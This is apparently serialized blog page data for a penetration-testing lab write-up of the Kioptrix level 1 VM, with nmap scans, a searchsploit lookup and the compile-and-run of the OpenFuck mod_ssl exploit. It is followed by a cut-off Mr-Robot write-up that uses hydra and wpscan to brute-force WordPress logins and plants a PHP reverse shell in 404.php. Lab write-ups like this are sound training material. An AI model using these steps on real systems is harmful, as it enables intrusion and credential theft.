negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 356.82 seconds`&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/Kioptrix level 1.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/1679306030928.png&quot;],[0,&quot;img/1679366939593.png&quot;],[0,&quot;img/1679366949376.png&quot;],[0,&quot;img/1679366954478.png&quot;],[0,&quot;img/1678960944499.png&quot;],[0,&quot;img/1678960950947.png&quot;]]],&quot;digest&quot;:[0,&quot;f2d5afa6b934df10&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;information-gathering\&quot;&gt;Information gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#information-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -T4 -sV -O 192.168.124.140 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script vuln 192.168.124.140 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.140 /usr/share/wordlists/dirb/big.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;method-1--samba\&quot;&gt;Method-1  Samba&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-1--samba\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679306030928.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nAttentions please,meterpreter is not availiable\nIt’s root.There is no need to escalate privilege.&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;method-2-openfuck-mod_ssl-vulnerability\&quot;&gt;Method-2 OpenFuck mod_ssl vulnerability&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-2-openfuck-mod_ssl-vulnerability\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit mod_ssl 2.8.4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679366939593.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit -p 47080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679366949376.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679366954478.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nWe need install libssl-dev first.&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;gcc -o OpenFuck 47080.c -lcrypto&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./OpenFuck&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./OpenFuck 0x6b 192.168.124.140 443 -c 40&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;There are some errors in compile process.&lt;/p&gt;\n&lt;h1 id=\&quot;enclosure\&quot;&gt;Enclosure&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#enclosure\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1678960944499.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1678960950947.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n`Nmap scan report for bogon (192.168.124.140)\nHost is up (0.0021s latency).\nNot shown: 65529 closed tcp ports (reset)\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)\n| vulners:\n|   cpe:/a:openbsd:openssh:2.9p2:\n|       CVE-2002-0640   10.0    &lt;a href=\&quot;https://vulners.com/cve/CVE-2002-0640\&quot;&gt;https://vulners.com/cve/CVE-2002-0640&lt;/a&gt;\n|       CVE-2002-0639   10.0    &lt;a href=\&quot;https://vulners.com/cve/CVE-2002-0639\&quot;&gt;https://vulners.com/cve/CVE-2002-0639&lt;/a&gt;\n|       CVE-2002-0083   10.0    &lt;a href=\&quot;https://vulners.com/cve/CVE-2002-0083\&quot;&gt;https://vulners.com/cve/CVE-2002-0083&lt;/a&gt;\n|       CVE-2011-2895   9.3     &lt;a href=\&quot;https://vulners.com/cve/CVE-2011-2895\&quot;&gt;https://vulners.com/cve/CVE-2011-2895&lt;/a&gt;\n|       CVE-2006-5051   9.3     &lt;a href=\&quot;https://vulners.com/cve/CVE-2006-5051\&quot;&gt;https://vulners.com/cve/CVE-2006-5051&lt;/a&gt;\n|       CVE-2006-4924   7.8     &lt;a href=\&quot;https://vulners.com/cve/CVE-2006-4924\&quot;&gt;https://vulners.com/cve/CVE-2006-4924&lt;/a&gt;\n|       CVE-2003-1562   7.6     &lt;a href=\&quot;https://vulners.com/cve/CVE-2003-1562\&quot;&gt;https://vulners.com/cve/CVE-2003-1562&lt;/a&gt;\n|       CVE-2010-4478   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2010-4478\&quot;&gt;https://vulners.com/cve/CVE-2010-4478&lt;/a&gt;\n|       CVE-2002-0575   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2002-0575\&quot;&gt;https://vulners.com/cve/CVE-2002-0575&lt;/a&gt;\n|       CVE-2001-1459   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2001-1459\&quot;&gt;https://vulners.com/cve/CVE-2001-1459&lt;/a&gt;\n|       CVE-2001-1380   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2001-1380\&quot;&gt;https://vulners.com/cve/CVE-2001-1380&lt;/a&gt;\n|       CVE-2001-0816   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2001-0816\&quot;&gt;https://vulners.com/cve/CVE-2001-0816&lt;/a&gt;\n|       SECURITYVULNS:VULN:1956 7.2     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1956\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1956&lt;/a&gt;\n|       CVE-2001-0529   7.2     &lt;a href=\&quot;https://vulners.com/cve/CVE-2001-0529\&quot;&gt;https://vulners.com/cve/CVE-2001-0529&lt;/a&gt;\n|       SSV:64479       5.0     &lt;a href=\&quot;https://vulners.com/seebug/SSV:64479\&quot;&gt;https://vulners.com/seebug/SSV:64479&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       SSV:6192        5.0     &lt;a href=\&quot;https://vulners.com/seebug/SSV:6192\&quot;&gt;https://vulners.com/seebug/SSV:6192&lt;/a&gt;     &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       SSV:60656       5.0     &lt;a href=\&quot;https://vulners.com/seebug/SSV:60656\&quot;&gt;https://vulners.com/seebug/SSV:60656&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       SSV:16847       5.0     &lt;a href=\&quot;https://vulners.com/seebug/SSV:16847\&quot;&gt;https://vulners.com/seebug/SSV:16847&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       PACKETSTORM:73600       5.0     &lt;a href=\&quot;https://vulners.com/packetstorm/PACKETSTORM:73600\&quot;&gt;https://vulners.com/packetstorm/PACKETSTORM:73600&lt;/a&gt;       &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       PACKETSTORM:54435       5.0     &lt;a href=\&quot;https://vulners.com/packetstorm/PACKETSTORM:54435\&quot;&gt;https://vulners.com/packetstorm/PACKETSTORM:54435&lt;/a&gt;       &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3    5.0     &lt;a href=\&quot;https://vulners.com/exploitpack/EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3\&quot;&gt;https://vulners.com/exploitpack/EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       EDB-ID:3303     5.0     &lt;a href=\&quot;https://vulners.com/exploitdb/EDB-ID:3303\&quot;&gt;https://vulners.com/exploitdb/EDB-ID:3303&lt;/a&gt;       &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       CVE-2010-5107   5.0     &lt;a href=\&quot;https://vulners.com/cve/CVE-2010-5107\&quot;&gt;https://vulners.com/cve/CVE-2010-5107&lt;/a&gt;\n|       CVE-2007-2243   5.0     &lt;a href=\&quot;https://vulners.com/cve/CVE-2007-2243\&quot;&gt;https://vulners.com/cve/CVE-2007-2243&lt;/a&gt;\n|       CVE-2006-5052   5.0     &lt;a href=\&quot;https://vulners.com/cve/CVE-2006-5052\&quot;&gt;https://vulners.com/cve/CVE-2006-5052&lt;/a&gt;\n|       SSV:66339       4.9     &lt;a href=\&quot;https://vulners.com/seebug/SSV:66339\&quot;&gt;https://vulners.com/seebug/SSV:66339&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       SSV:10777       4.9     &lt;a href=\&quot;https://vulners.com/seebug/SSV:10777\&quot;&gt;https://vulners.com/seebug/SSV:10777&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3    4.9     &lt;a href=\&quot;https://vulners.com/exploitpack/EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3\&quot;&gt;https://vulners.com/exploitpack/EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       EDB-ID:8163     4.9     &lt;a href=\&quot;https://vulners.com/exploitdb/EDB-ID:8163\&quot;&gt;https://vulners.com/exploitdb/EDB-ID:8163&lt;/a&gt;       &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       CVE-2009-0537   4.9     &lt;a href=\&quot;https://vulners.com/cve/CVE-2009-0537\&quot;&gt;https://vulners.com/cve/CVE-2009-0537&lt;/a&gt;\n|       CVE-2012-0814   3.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2012-0814\&quot;&gt;https://vulners.com/cve/CVE-2012-0814&lt;/a&gt;\n|       CVE-2011-4327   2.1     &lt;a href=\&quot;https://vulners.com/cve/CVE-2011-4327\&quot;&gt;https://vulners.com/cve/CVE-2011-4327&lt;/a&gt;\n|       CVE-2008-3259   1.2     &lt;a href=\&quot;https://vulners.com/cve/CVE-2008-3259\&quot;&gt;https://vulners.com/cve/CVE-2008-3259&lt;/a&gt;\n|       SECURITYVULNS:VULN:1953 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1953\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1953&lt;/a&gt;\n|       SECURITYVULNS:VULN:1608 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1608\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1608&lt;/a&gt;\n|       SECURITYVULNS:VULN:1499 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1499\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1499&lt;/a&gt;\n|       SECURITYVULNS:VULN:1488 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1488\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1488&lt;/a&gt;\n|       SECURITYVULNS:VULN:1474 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1474\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1474&lt;/a&gt;\n|       SECURITYVULNS:VULN:1439 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1439\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1439&lt;/a&gt;\n|       SECURITYVULNS:VULN:1344 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1344\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1344&lt;/a&gt;\n|       SECURITYVULNS:VULN:1262 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1262\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1262&lt;/a&gt;\n|_      SECURITYVULNS:VULN:1233 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1233\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1233&lt;/a&gt;\n80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)\n| http-enum:\n|   /test.php: Test page\n|   /icons/: Potentially interesting directory w/ listing on ‘apache/1.3.20’\n|   /manual/: Potentially interesting directory w/ listing on ‘apache/1.3.20’\n|_  /usage/: Potentially interesting folder\n|_http-stored-xss: Couldn’t find any stored XSS vulnerabilities.\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-trace: TRACE is enabled\n|&lt;em&gt;http-dombased-xss: Couldn’t find any DOM based XSS.\n|&lt;em&gt;http-csrf: Couldn’t find any CSRF vulnerabilities.\n111/tcp  open  rpcbind     2 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1           1024/tcp   status\n|&lt;/em&gt;  100024  1           1024/udp   status\n139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)\n443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n| ssl-dh-params:\n|   VULNERABLE:\n|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)\n|     State: VULNERABLE\n|     IDs:  BID:74733  CVE:CVE-2015-4000\n|       The Transport Layer Security (TLS) protocol contains a flaw that is\n|       triggered when handling Diffie-Hellman key exchanges defined with\n|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker\n|       to downgrade the security of a TLS session to 512-bit export-grade\n|       cryptography, which is significantly weaker, allowing the attacker\n|       to more easily break the encryption and monitor or tamper with\n|       the encrypted stream.\n|     Disclosure date: 2015-5-19\n|     Check results:\n|       EXPORT-GRADE DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus\n|             Modulus Length: 512\n|             Generator Length: 8\n|             Public Key Length: 512\n|     References:\n|       &lt;a href=\&quot;https://weakdh.org\&quot;&gt;https://weakdh.org&lt;/a&gt;\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000&lt;/a&gt;\n|       &lt;a href=\&quot;https://www.securityfocus.com/bid/74733\&quot;&gt;https://www.securityfocus.com/bid/74733&lt;/a&gt;\n|&lt;br&gt;\n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|&lt;/em&gt;      &lt;a href=\&quot;https://weakdh.org\&quot;&gt;https://weakdh.org&lt;/a&gt;\n|&lt;em&gt;http-dombased-xss: Couldn’t find any DOM based XSS.\n| ssl-ccs-injection:\n|   VULNERABLE:\n|   SSL/TLS MITM vulnerability (CCS Injection)\n|     State: VULNERABLE\n|     Risk factor: High\n|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h\n|       does not properly restrict processing of ChangeCipherSpec messages,\n|       which allows man-in-the-middle attackers to trigger use of a zero\n|       length master key in certain OpenSSL-to-OpenSSL communications, and\n|       consequently hijack sessions or obtain sensitive information, via\n|       a crafted TLS handshake, aka the “CCS Injection” vulnerability.\n|&lt;br&gt;\n|     References:\n|       &lt;a href=\&quot;http://www.openssl.org/news/secadv_20140605.txt\&quot;&gt;http://www.openssl.org/news/secadv_20140605.txt&lt;/a&gt;\n|       &lt;a href=\&quot;http://www.cvedetails.com/cve/2014-0224\&quot;&gt;http://www.cvedetails.com/cve/2014-0224&lt;/a&gt;\n|&lt;/em&gt;      &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224&lt;/a&gt;\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|&lt;em&gt;http-csrf: Couldn’t find any CSRF vulnerabilities.\n| ssl-poodle:\n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the “POODLE” issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_3DES_EDE_CBC_SHA\n|     References:\n|       &lt;a href=\&quot;https://www.openssl.org/~bodo/ssl-poodle.pdf\&quot;&gt;https://www.openssl.org/~bodo/ssl-poodle.pdf&lt;/a&gt;\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566&lt;/a&gt;\n|       &lt;a href=\&quot;https://www.imperialviolet.org/2014/10/14/poodle.html\&quot;&gt;https://www.imperialviolet.org/2014/10/14/poodle.html&lt;/a&gt;\n|&lt;/em&gt;      &lt;a href=\&quot;https://www.securityfocus.com/bid/70574\&quot;&gt;https://www.securityfocus.com/bid/70574&lt;/a&gt;\n|_http-stored-xss: Couldn’t find any stored XSS vulnerabilities.\n|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)\n|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)\n|_sslv2-drown: ERROR: Script execution failed (use -d to debug)\n1024/tcp open  status      1 (RPC #100024)\nMAC Address: 00:0C:29:7C:3A:16 (VMware)&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;Host script results:\n| smb-vuln-cve2009-3103:\n|   VULNERABLE:\n|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2009-3103\n|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,\n|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a\n|           denial of service (system crash) via an &amp;#x26; (ampersand) character in a Process ID High header field in a NEGOTIATE\n|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,\n|           aka “SMBv2 Negotiation Vulnerability.”\n|&lt;br&gt;\n|     Disclosure date: 2009-09-08\n|     References:\n|       &lt;a href=\&quot;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\&quot;&gt;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103&lt;/a&gt;\n|_      &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103&lt;/a&gt;\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]&lt;/p&gt;\n&lt;p&gt;Service detection performed. Please report any incorrect results at &lt;a href=\&quot;https://nmap.org/submit/\&quot;&gt;https://nmap.org/submit/&lt;/a&gt; .\nNmap done: 1 IP address (1 host up) scanned in 356.82 seconds`&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;information-gathering&quot;],&quot;text&quot;:[0,&quot;Information gathering&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-1--samba&quot;],&quot;text&quot;:[0,&quot;Method-1  Samba&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-2-openfuck-mod_ssl-vulnerability&quot;],&quot;text&quot;:[0,&quot;Method-2 OpenFuck mod_ssl vulnerability&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclosure&quot;],&quot;text&quot;:[0,&quot;Enclosure&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/1679306030928.png&quot;],[0,&quot;img/1679366939593.png&quot;],[0,&quot;img/1679366949376.png&quot;],[0,&quot;img/1679366954478.png&quot;],[0,&quot;img/1678960944499.png&quot;],[0,&quot;img/1678960950947.png&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Kioptrix level 1&quot;],&quot;date&quot;:[3,&quot;2023-03-20T03:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/1679306030928.png&quot;],[0,&quot;img/1679366939593.png&quot;],[0,&quot;img/1679366949376.png&quot;],[0,&quot;img/1679366954478.png&quot;],[0,&quot;img/1678960944499.png&quot;],[0,&quot;img/1678960950947.png&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/10&quot;]}],&quot;nextPostItem&quot;:[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/mr-robot&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Mr-Robot&quot;],&quot;date&quot;:[3,&quot;2023-02-09T03:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;# Information gathering\n```\nnetdiscover -r 192.168.124.0/24\nnmap -sV -O -Pn -T4 192.168.124.80 -p-\nnmap --script vuln 192.168.124.80 -p-\ndirb http://192.168.124.80 /usr/share/wordlist/dirb/big.txt\n```\nFound login page\n![](img/1675935901724.PNG)\nThe wordlist of fsocity.dic\n![](img/1675935906897.PNG)\n\nThe first key\n\n![](img/1675935911648.PNG)\n***\n# Method-1\n## Exploit wordpress\nsort and uniq\n```\nsort fsocity.dic | uniq &gt; fsocity-sort.dic\n```\nHydra enumerate users\n```\nhydra -t 64 -L fsocity-sort.dic -p test 192.168.124.4 http-form-post \&quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In:Invalid username\&quot;\n```\n![](img/1675935995098.PNG)\n\nWpscan intrude users and password\n```\nwpscan --url http://192.168.124.4/  --usernames Elliot --passwords fsocity-sort.dic\n```\n![](img/1675936001210.PNG)\n\n[Valid Combinations Found:\n Username: Elliot, Password: ER28-0652\nLogin in wordpress\n***\n## Getshell\nVisit Appearance-Editor,write shell code into 404.php\nThere are plenty of webshell in /usr/share/webbshells/php/\nUse php-reverse-shell.php\nRemember to change its ip and port\n![](img/1675936011245.png)\n\n\nlisten port 1234 on kali.\nThen  visit any pay which  not 